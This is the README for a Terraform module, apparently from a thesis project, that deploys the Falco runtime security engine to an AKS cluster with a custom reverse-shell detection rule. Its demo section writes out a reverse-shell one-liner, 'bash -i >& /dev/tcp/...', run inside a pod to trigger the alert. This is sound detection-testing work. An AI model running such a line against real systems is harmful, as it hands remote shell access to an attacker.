# falco

Installs the Falco runtime security engine as a DaemonSet into the AKS cluster via Helm.

Falco watches kernel syscalls (via the modern eBPF probe) and raises alerts on suspicious runtime behaviour. This module ships one custom rule — `Reverse Shell In Container` — covering attack #6 from the thesis.

The custom rule lives in `values.yaml` (`customRules`) alongside the engine, kept minimal: the rule is tightly coupled to the runtime engine and small enough not to warrant a separate GitOps layer.

## Apply

```bash
terraform init
terraform apply
```

Reads AKS kubeconfig from `aks.tfstate` via `terraform_remote_state`.

## Verify

```bash
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=20
```

## Trigger the reverse-shell alert (attack #6 demo)

```bash
# exec into any running app pod and open an outbound shell connection
kubectl exec -it -n dev deploy/account-service -- sh -c \
  'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1'

# watch Falco fire CRITICAL "Reverse shell detected in container"
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco -f | grep -i reverse
```
